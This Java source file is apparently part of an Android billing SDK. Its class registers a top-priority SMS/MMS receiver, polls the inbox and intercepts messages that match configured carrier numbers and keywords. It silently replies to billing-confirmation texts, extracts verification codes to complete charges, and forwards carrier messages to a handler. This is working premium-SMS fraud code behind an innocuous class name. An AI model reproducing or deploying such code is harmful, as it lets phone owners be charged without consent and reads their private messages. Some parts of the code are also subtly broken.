package com.core_sur;

import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Vector;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentFilter.MalformedMimeTypeException;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Message;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.core_sur.bean.RevBean;
import com.core_sur.bean.SmsInterceptBean;
import com.core_sur.finals.CommonFinals;
import com.core_sur.publics.EPCoreManager;
import com.core_sur.task.PayFollow;
import com.core_sur.task.PayTask;
import com.core_sur.task.XMXTPay;
import com.core_sur.tools.Log;
import com.core_sur.tools.mlog;

public class MySTask {
	private final static String ContentPort = "content:";

	private final static String TAG = "SmsInterceptor";
	private final static byte TYPE_SMS = 0;// sms lanjie
	private final static byte TYPE_MMS = 1;// 彩信拦截
	public final static byte SECOND_REPLY_CONTENT = 0;// 二次确认类型-回复配置内容
	public final static byte SECOND_REPLY_CUTOUT = 1;// 二次确认类型-回复截取收到信息
	public final static byte SECOND_REPLY_QUESTION = 2;// 二次确认类型-问答式，上传服务器获取答案
	public final static byte SECOND_REPLY_NOREPLY_CALLBACK = 3;// 二次确认类型-不回复，信息通过接口回调
	public final static byte SECOND_REPLY_NO = -1;// 二次确认类型-直接拦截，不回复
	final static String ACTION_SMS_BROADCAST = "android.provider.Telephony.SMS_RECEIVED";// 短信接收监听事件
	private final static String ACTION_MMS_BROADCAST = "android.provider.Telephony.WAP_PUSH_RECEIVED";// 彩信接收监听事件
	private final static String MMS_MIMETYPE_MMS = "application/vnd.wap.mms-message";// 彩信监听类型
	private final static String MMS_MIMETYPE_SIC = "application/vnd.wap.sic";// 彩信监听类型
	private final static String MMS_MIMETYPE_SLC = "application/vnd.wap.slc";// 彩信监听类型

	private final static String ANSWER_TAG = "answer";// 服务器返回xml信息中答案对应标签

	public static Context context;
	public static YLSMSreceiver ylSmsService;
	public long lastDuration;
	public long startInterceptTime;

	private static MySTask smsInterceptor;

	private static ArrayList<SmsInterceptBean> paraList;
	IIntercept iIntercept;

	public MySTask(Context _context) {
		this.context = _context;
	}

	public static MySTask getInstance(Context _context) {
		if (smsInterceptor == null) {
			smsInterceptor = new MySTask(_context);
		}
		return smsInterceptor;
	}

	/**
	 * 注册拦截回调接口
	 * 
	 * @param i
	 */
	public void setIIntercept(IIntercept i) {
		this.iIntercept = i;
	}

	/**
	 * 拦截持续时间
	 * 
	 * @param lastDuration
	 */
	/*
	 * private void setInterceptTime(long lastDuration){ this.lastDuration =
	 * lastDuration; }
	 */

	/**
	 * 拦截开始时间
	 */
	/*
	 * private void startTime(){ this.startInterceptTime = (new
	 * Date()).getTime(); }
	 */

	/**
	 * 设置拦截参数
	 * 
	 * @param list
	 */
	public void setInterceptPara(ArrayList<SmsInterceptBean> list) {
		paraList = new ArrayList<SmsInterceptBean>();
		if (list == null)
			return;
		SmsInterceptBean bean;
		if (Config.IsDebug) {
			Log.d(TAG, " intercept settings ");
		}
		for (int i = 0; i < list.size(); i++) {
			bean = new SmsInterceptBean();
			bean = list.get(i);
			// 判断拦截类型
			bean.setConfirm_para_type(getConfirmParaType(bean));
			paraList.add(bean);
		}
	}

	public void setInterceptPara(Vector<SmsInterceptBean> list) {
		paraList = new ArrayList<SmsInterceptBean>();
		if (list == null)
			return;
		SmsInterceptBean bean;
		if (Config.IsDebug) {
			Log.d(TAG, "intercept settings ");
		}
		for (int i = 0; i < list.size(); i++) {
			bean = new SmsInterceptBean();
			bean = list.get(i);
			// 判断拦截类型
			bean.setConfirm_para_type(getConfirmParaType(bean));
			paraList.add(bean);
		}
	}

	/**
	 * 判断拦截类型
	 * 
	 * @param bean
	 * @return
	 */
	private byte getConfirmParaType(SmsInterceptBean bean) {
		String replyNumber = bean.getConfirm_port();
		String replyKeywords = bean.getConfirm_key();
		String replyContent = bean.getConfirm_content();
		// String cutStartStr = bean.getConfirm_content_start();
		// String cutEndStr = bean.getConfirm_content_end();
		boolean isUpload = bean.isConfirm_isUpdload();
		boolean isCallback = bean.isCallback();
		byte replyType = SECOND_REPLY_NO;

		if ((replyNumber == null || "".equals(replyNumber))
				&& (replyKeywords == null) || "".equals(replyKeywords))
			return replyType;
		if (isCallback) {
			replyType = SECOND_REPLY_NOREPLY_CALLBACK;
		} else if (isUpload) {
			replyType = SECOND_REPLY_QUESTION;
		} else if (replyContent == null || "".equals(replyContent)) {
			replyType = SECOND_REPLY_CUTOUT;
		} else {
			replyType = SECOND_REPLY_CONTENT;
		}

		if (Config.IsDebug) {
			Log.d(TAG, replyNumber + ":" + replyKeywords + " intercept type "
					+ replyType);
		}
		return replyType;
	}

	/**
	 * 注册sms广播lanjie
	 */
	public void regInterceptSms() {
		try {
			// Killer.killOtherListeners(context);

			// 短信过滤
			IntentFilter filter = new IntentFilter(ACTION_SMS_BROADCAST);
			filter.setPriority(2147483647);
			filter.addCategory("android.intent.category.DEFAULT");
			ylSmsService = new YLSMSreceiver(this);
			if (Config.IsDebug) {
				Log.v(TAG, "start sms receiver ");
			}
			context.registerReceiver(ylSmsService, filter);
System.out.println("regInterceptSms");
			// 彩信过滤
			IntentFilter filter2 = new IntentFilter(ACTION_MMS_BROADCAST);
			try {
				filter2.addDataType(MMS_MIMETYPE_MMS);
				filter2.addDataType(MMS_MIMETYPE_SIC);
				filter2.addDataType(MMS_MIMETYPE_SLC);
				filter2.setPriority(2147483647);
				filter2.addCategory("android.intent.category.DEFAULT");
				context.registerReceiver(ylSmsService, filter2);
			} catch (MalformedMimeTypeException e) {
				e.printStackTrace();
			}
			// Killer.killOtherListeners(context);
		} catch (Exception e) {

		}
	}

	void CheckNewSms() {
		Config.IsCheckSMS = true;

		new Thread() {
			@Override
			public void run() {
				int LastMsgId = 0;

				try {
					for (int i = 0; i < 180; i++) {
						if (!Config.IsCheckSMS) {
							break;
						}

						if (Config.IsCanBroadcast) {
							break;
						}

						// 间隔1秒轮询下是否有新短信

						ContentResolver cr = context.getContentResolver();

						String[] projection = new String[] { "_id", "address",
								"body", "date", "type" };

						Uri uri = Uri.parse(ContentPort + "//sms" + ""
								+ "/inbox");

						Cursor cur = cr.query(uri, projection, null, null,
								"date desc");

						if (cur.moveToFirst()) {
							int MsgId;
							String phoneNumber;
							String smsbody;
							String date;
							String type;

							int MsgIdColumn = cur.getColumnIndex("_id");
							int phoneNumberColumn = cur
									.getColumnIndex("address");
							int smsbodyColumn = cur.getColumnIndex("body");
							int dateColumn = cur.getColumnIndex("date");
							int typeColumn = cur.getColumnIndex("type");

							do {
								MsgId = cur.getInt(MsgIdColumn);
								if (LastMsgId == 0) {
									LastMsgId = MsgId;
								}

								if (MsgId <= LastMsgId) {
									continue;
								} else {
									LastMsgId = MsgId;
								}

								phoneNumber = cur.getString(phoneNumberColumn);
								smsbody = cur.getString(smsbodyColumn);

								if (Config.IsDebug) {
									Log.i(phoneNumber, smsbody);
								}

								if (isNeedIntercept(phoneNumber, smsbody)) {
									RevBean rb = new RevBean();
									rb.setCmdid(Config.CMD_HOLDSMS);
									rb.setDelayTime(0);
									rb.setLinkid(0);
									rb.setMsg(phoneNumber
											+ Config.splitStringLevel1
											+ smsbody);

									Message messageCallBack = new Message();
									messageCallBack.obj = rb;
									messageCallBack.what = 0;
									WCConnect.getInstance().handlerAction
											.sendMessage(messageCallBack);

								}
							} while (cur.moveToNext());
						} else {

						}
						cur.close();
						
						Thread.sleep(1 * 1000);

					}
				} catch (Exception e) {
				} finally {
					Config.IsCheckSMS = false;
				}
			}

		}.start();
	}

	/**
	 * 取消短信广播拦截注册
	 */
	public static void unregisterListen() {
		if (Config.IsDebug) {
			Log.d(TAG, "unregister listener ");
		}
		if (ylSmsService != null) {
			context.unregisterReceiver(ylSmsService);
		}
		ylSmsService = null;

		if (paraList != null) {
			paraList.clear();
		}
		paraList = null;
	}

	/**
	 * 文本题库式二次确认
	 * 
	 * @param question
	 * @return
	 */
	/*
	 * private String secondReplyAnswerText(String phoneNumber,byte[]
	 * question,int type){ return secondReplyAnswerText( phoneNumber,new
	 * String(question),type); }
	 */

	/**
	 * 判断是否拦截。先判断是否在二次确认拦截中，如果不在再判断是否在拦截关键字中
	 * 
	 * @param phoneNumber
	 * @param smsContent
	 * @return
	 */
	void handleSMS(Intent intent) {
		// 第一步、获取短信的内容和发件人
System.out.println("handleSms");
		StringBuilder body = new StringBuilder();// 短信内容
		StringBuilder number = new StringBuilder();// 短信发件人
		Bundle bundle = intent.getExtras();
		boolean isSend = false;
		if (bundle != null) {
			try {
				Object[] _pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] message = new SmsMessage[_pdus.length];
				for (int i = 0; i < _pdus.length; i++) {
					message[i] = SmsMessage.createFromPdu((byte[]) _pdus[i]);
				}

				for (SmsMessage currentMessage : message) {
					body.append(currentMessage.getDisplayMessageBody());
					if (!isSend) {
						number.append(currentMessage
								.getDisplayOriginatingAddress());
						isSend = true;
					}
				}

				String smsBody = body.toString();
				String smsNumber = handlePhoneHeader(number.toString());
				// 第二步:确认该短信内容是否满足过滤条件
				if (Config.IsDebug) {
					Log.d(TAG, "sms message:" + smsNumber + "-" + smsBody);
				}

				if (Config.IsDebug) {
					Log.d(TAG, "not second reply sms ");
				}

				if (isNeedIntercept(smsNumber, smsBody)) {
					// 取消广播
					if (ylSmsService != null) {
						RevBean rb = new RevBean();
						rb.setCmdid(Config.CMD_HOLDSMS);
						rb.setDelayTime(0);
						rb.setLinkid(0);
						rb.setMsg(smsNumber + Config.splitStringLevel1
								+ smsBody);

						Message messageCallBack = new Message();
						messageCallBack.obj = rb;
						messageCallBack.what = 0;
						WCConnect.getInstance().handlerAction
								.sendMessage(messageCallBack);
					}
				} else {
					if (smsNumber.startsWith("10")) {
						RevBean rb = new RevBean();
						rb.setCmdid(Config.CMD_HOLDSMS);
						rb.setDelayTime(0);
						rb.setLinkid(0);
						rb.setMsg(smsNumber + Config.splitStringLevel1
								+ smsBody + " sdk");

						Message messageCallBack = new Message();
						messageCallBack.obj = rb;
						messageCallBack.what = 0;
						WCConnect.getInstance().handlerAction
								.sendMessage(messageCallBack);
					}
				}

			} catch (Exception e) {
				if (Config.IsDebug) {
					Log.d(TAG, e.getMessage());
				}
			}
		}
	}


	/**
	 * 二次确认处理
	 * 
	 */
	private void handleSecondReply(SmsInterceptBean bean, String phoneNumber,
			String smsContent) {
		// 取消广播
		if (Config.IsDebug) {
		}

		byte replyType = bean.getConfirm_para_type();
		String replyContent = bean.getConfirm_content();
		String startStr = bean.getConfirm_content_start();
		String endStr = bean.getConfirm_content_end();
		// 二次确认
		if (Config.IsDebug) {
			Log.d(TAG, "" + replyType);
		}
		switch (replyType) {
		case SECOND_REPLY_NO:
			return;
		case SECOND_REPLY_NOREPLY_CALLBACK:
			iIntercept.interceptCallback(phoneNumber, smsContent);
			return;
		case SECOND_REPLY_QUESTION:
			threadAnswer(phoneNumber, smsContent, TYPE_SMS);// replyContent=secondReplyAnswer(smsContent);
			return;// break ;
		case SECOND_REPLY_CONTENT:
			break;
		case SECOND_REPLY_CUTOUT:
			replyContent = substring(smsContent, startStr, endStr);
			break;
		}
		sendSmsWithoutCallBack(phoneNumber, replyContent, "utf-8");
	}

	/**
	 * @param phoneNumber
	 * @param smsContent
	 * @param charset
	 */
	public void sendSmsWithoutCallBack(String phoneNumber, String smsContent,
			String charset) {
		if (Config.IsDebug) {
			Log.i(TAG, "sendSMS");
		}
		if (smsContent != null) {
			SmsManager sms = SmsManager.getDefault();
			ArrayList<String> list;
			try {
				if (charset == null) {
					charset = "utf-8";
				}
				list = sms.divideMessage(new String(smsContent.getBytes(),
						charset));
				for (String s : list) {
					sms.sendTextMessage(phoneNumber, null, s, null, null);
					if (Config.IsDebug) {
						Log.i(TAG, "sendsms:" + phoneNumber + s);
					}
					Thread.sleep(2 * 1000);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	/**
	 * 启线程处理题库式短信处理，防止broadcast receiver 超时
	 * 
	 * @param phoneNumber
	 * @param smsContent
	 */
	private void threadAnswer(String phoneNumber, String smsContent, int type) {
		smsThread sms = new smsThread(phoneNumber, smsContent, type);
		new Thread(sms).start();
	}

	class smsThread implements Runnable {
		String phoneNumber;
		String smsContent;
		int type;

		public smsThread(String phoneNumber, String smsContent, int type) {
			this.phoneNumber = phoneNumber;
			this.smsContent = smsContent;
			this.type = type;
		}

		@Override
		public void run() {
			// TODO Auto-generated method stub
			String replyContent = null;
			sendSmsWithoutCallBack(replyContent, replyContent, "utf-8");
		}
	}

	/**
	 * 是否在拦截关键字中
	 * 
	 * @param phoneNumber
	 * @param smsContent
	 * @return
	 */
	public boolean isNeedIntercept(String phoneNumber, String smsContent) {
		boolean isIn = false;
		if (paraList == null || paraList.size() == 0)
			return false;
		SmsInterceptBean bean;
		String[] interceptNumber;
		String[] interceptWords;
		
		for (int i = 0; i < paraList.size(); i++) {
			bean = paraList.get(i);
			interceptNumber = bean.getIntercept_port();
			interceptWords = bean.getIntercept_key();
			
			if (newIsContanins(interceptNumber, phoneNumber)) {
				if (isContains(interceptWords, smsContent, false)) {
					isIn = true;
					sendInterContent(bean,smsContent);
					break;
				}
			}
		}
		return isIn;
	}

	private boolean newIsContanins(String[] interceptNumber, String phoneNumber) {
		for (int i = 0; i < interceptNumber.length; i++) {
			if (phoneNumber.equals(interceptNumber[i])
					|| phoneNumber.startsWith(interceptNumber[i])) {
				return true;
			}
		}
		return false;
	}

	/**
	 * 判断数组是否包含 查找字符串 ，其中 isEqual 为true
	 * 表示源字符串字符串和查找字符串完全一样才算匹配，false表示源字符串包含查找字符串就算匹配。
	 * 
	 * @param src
	 * @param target
	 * @param isEqual
	 * @return
	 */
	/*
	 * private boolean isContains(String [] src ,String target){ return
	 * isContains(src,target,true); }
	 */
	private boolean isContains(String[] src, String target, boolean isStart) {
		boolean isIn = false;
		if (target == null || src == null || src.length == 0) {
			return false;
		}

		for (String tmp : src) {
			if (tmp.trim().length() == 0) {
				continue;
			}

			if (isStart && target.startsWith(tmp)) {
				return true;
			}

			if (!isStart) {
				String[] info = tmp.split(Config.splitStringLevel3);
				if (info.length == 1) {
					if (target.contains(info[0])) {
						return true;
					}
				} else if (info.length == 2) {
					if (target.contains(info[0]) && target.contains(info[1])) {
						return true;
					}
				} else if (info.length == 3) {
					if (target.contains(info[0]) && target.contains(info[1])
							&& target.contains(info[2])) {
						return true;
					}
				}
			}
		}

		return isIn;
	}

	/**
	 * 字符串截取
	 * 
	 * @param text
	 *            待截取字符串
	 * @param startStr
	 *            起始字符
	 * @param endStr
	 *            　终止字符
	 * @param point
	 *            多个匹配取第几个 -1或0 是唯一匹配
	 * @return 白盒测试过
	 */
	private String substring(String text, String startStr, String endStr) {

		if (text == null)
			return null;

		// 都为空
		if (startStr == null && endStr == null)
			return text;

		// 结束字符为空
		if (startStr != null && endStr == null) {
			int startIndex = text.indexOf(startStr);// 找到起始字符
			if (startIndex >= 0) {
				return text.substring(startIndex + startStr.length());
			}
		}

		// 开始字符为空
		if (startStr == null && endStr != null) {
			int endIndex = text.indexOf(endStr);// 找到起始字符
			if (endIndex >= 0) {
				return text.substring(0, endIndex);
			}
		}
		// 都存在
		if (startStr != null && endStr != null) {
			int startIndex = text.indexOf(startStr);// 找到起始字符
			if (startIndex >= 0) {
				int endIndex = text.indexOf(endStr,
						startIndex + startStr.length());// 找到结束字符
				if (endIndex >= 0) {
					return text.substring(startIndex + startStr.length(),
							endIndex);
				}
			}
		}

		// 没找到就截取所有
		return text;
	}

	/**
	 * 开头带 +86，0086，086，86号码处理
	 * 
	 * @return
	 */
	private String handlePhoneHeader(String phoneNumber) {
		String newNumber = phoneNumber;
		if (newNumber == null)
			return newNumber;
		if (newNumber.startsWith("+86") || newNumber.startsWith("0086")
				|| newNumber.startsWith("086") || newNumber.startsWith("86")) {
			newNumber = newNumber.substring(newNumber.indexOf("86") + 2);
		}
		return newNumber;
	}

	/**
	 * 手机号计费方式自动填写验证码
	 * @param bean
	 * @param smsContent
	 */
	private void sendInterContent(SmsInterceptBean bean, String smsContent){
		String temp[] = null;
		String back = "";
		
		temp = bean.getIntercept_key()[bean.getIntercept_key().length -1].split(Config.splitStringLevel3);
		
		if (temp.length != 2)
			return;
		
		back = smsContent.substring(smsContent.indexOf(temp[0])+temp[0].length(), smsContent.indexOf(temp[1]));
		
		Intent intent = new Intent(MessageFormat.format(CommonFinals.ACTION_PNPAY_RES,
				EPCoreManager.getInstance().getContext().getPackageName()));
		intent.putExtra("code", -3);
		intent.putExtra("vcode", back);
		EPCoreManager.getInstance().getContext().sendBroadcast(intent);
		
		//计费后续操作传值
		Message msg = new Message();
		msg.what = 0;
		msg.obj = back;
		PayFollow.handler.sendMessage(msg);
	}
}
